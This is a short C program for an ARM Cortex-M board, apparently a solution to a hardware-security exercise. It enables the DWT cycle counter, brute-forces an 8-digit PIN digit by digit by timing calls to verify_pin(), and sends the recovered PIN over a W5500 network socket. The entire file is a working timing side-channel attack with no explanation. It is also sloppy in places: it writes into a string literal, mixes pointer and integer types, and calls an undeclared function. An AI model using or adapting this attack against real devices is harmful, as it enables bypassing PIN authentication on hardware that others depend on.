#include <stdint.h>

#define demcr (*((volatile uint32_t*)0xe000edfc))
#define dwt_ctrl (*((volatile uint32_t*)0xe0001000))
#define dwt_cyccnt (*((volatile uint32_t*)0xe0001004))

int verify_pin(char*);

struct socket_t {
    uint32_t dev;
    uint8_t no;
} socket_t;

uint32_t measure(struct socket_t* sock, char* pin){
    uint32_t time = 0;
    for (int i = 0; i < 10; ++i){
        dwt_cyccnt = 0;
        verify_pin(pin);
        time += dwt_cyccnt;
    }
    return time;
}

void shell_main(){
    demcr |= (1 << 24);
    dwt_ctrl |= 1;

    struct socket_t sock;
    extern uint32_t w5500;
    sock.dev = &w5500;
    sock.no = 0;

    char* pin = "00000000\n\0";
    for (int i = 0; i < 8; ++i){
        uint32_t best = 0;
        char digit = 0;
        for (int j = 0; j < 10; ++j){
            pin[i] = '0' + j;
            uint32_t time = measure(&sock, pin);
            if (time > best){
                best = time;
                digit = j;
            }
        }
        pin[i] = '0' + digit;
    }
    socket_print(&sock, pin);
}
